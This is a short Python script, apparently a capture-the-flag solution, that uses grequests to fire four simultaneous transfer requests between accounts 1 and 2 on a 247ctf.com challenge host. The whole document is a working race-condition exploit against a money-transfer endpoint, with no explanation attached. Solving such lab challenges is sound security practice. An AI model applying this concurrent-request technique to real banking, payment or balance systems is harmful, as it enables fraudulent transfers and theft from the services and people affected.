import grequests
url = [
    "https://2198dfac98246962.247ctf.com/?&to=1&from=2&amount=10",
    "https://2198dfac98246962.247ctf.com/?&to=2&from=1&amount=20",
    "https://2198dfac98246962.247ctf.com/?&to=1&from=2&amount=30",
    "https://2198dfac98246962.247ctf.com/?&to=2&from=1&amount=20"
    ]

rs = (grequests.get(u) for u in url)

grequests.map(rs)